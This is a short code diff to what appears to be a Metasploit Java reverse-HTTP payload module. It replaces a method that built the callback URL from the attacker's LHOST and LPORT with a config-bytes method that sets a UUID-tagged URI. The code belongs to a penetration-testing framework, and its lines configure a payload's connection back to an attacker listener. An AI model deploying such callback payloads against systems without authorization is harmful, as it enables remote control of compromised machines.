@@ -35,19 +35,10 @@ module MetasploitModule
     transport_config_reverse_http(opts)
   end
 
-  def payload_uri(req=nil)
-    # Default URL length is 30-256 bytes
+  def generate_config_bytes(opts={})
     uri_req_len = 30 + luri.length + rand(256 - (30 + luri.length))
-    # Generate the short default URL if we don't know available space
-    if self.available_space.nil?
-      uri_req_len = 5
-    end
-
-    url = "http://#{datastore["LHOST"]}:#{datastore["LPORT"]}#{luri}"
-    # TODO: perhaps wire in an existing UUID from opts?
-    url << generate_uri_uuid_mode(:init_java, uri_req_len)
-
-    url
+    opts[:uri] = generate_uri_uuid_mode(:init_java, uri_req_len)
+    super(opts)
   end
 
 end
